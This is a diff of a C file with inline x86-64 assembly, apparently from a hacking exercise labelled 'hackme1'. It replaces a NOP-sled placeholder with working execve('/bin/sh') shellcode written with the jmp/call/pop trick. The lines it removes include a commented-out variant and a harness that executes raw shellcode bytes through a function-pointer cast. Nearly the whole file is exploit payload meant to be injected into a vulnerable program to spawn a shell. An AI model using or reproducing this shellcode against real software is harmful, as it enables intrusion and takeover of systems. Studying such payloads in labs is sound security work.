@@ -1,178 +1,21 @@
 int main(void)
 //put shellcode instructions in the __asm___() part, then run ./makeshellcode script
 //will only take the code up until ret, so be careful if you use ret yourself
+//this contains the shellcode for hackme1
 {
   __asm__ (
-    "here: nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "nop;"
-    "jp here;"
+    "jmp j2;"
+    "j1: jmp start;"
+    "j2: call j1;" //put the address of the string /bin/sh on the stack
+    ".ascii \"/bin/shX\";"
+    "start: pop %rdi;" //take the address of the string /bin/sh from the stack
+    "xor %rax, %rax;" //set RAX to zero
+    "movb %al, 7(%rdi);" //set a nullbyte after the /bin/sh in the written file
+    "mov $0x3b, %al;" //put the syscall number in rax    
+    "xor %rsi,%rsi;" //RSI must be set to zero
+    "xor %rdx,%rdx;" //RDX must be set to zero    
+    "syscall;"
+    
   );
   return 0;
 }
-
-/*
-    "mov	$0x68732f6e69622f58, %rbx;"
-    "shr    $0x8, %rbx;"
-    "push   %rbx;"
-    "mov    %rsp, %rdi;"
-    "push   %rax;"
-    "push   %rdi;"
-    "mov    %rsp, %rsi;"
-    "mov    $0x3b, %al;"
-    "syscall;"
-*/
-
-/*
-
- 
-int main(void)
-{
-    char shellcode[] =
-    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
-    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
-    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
-    "\x53"                                          // push   %rbx
-    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
-    "\x50"                                          // push   %rax
-    "\x57"                                          // push   %rdi
-    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
-    "\xb0\x3b"                                      // mov    $0x3b, %al
-    "\x0f\x05";                                     // syscall
- 
-    (*(void (*)()) shellcode)();
-     
-    return 0;
-}
-
-
-
-
-
-
-*/
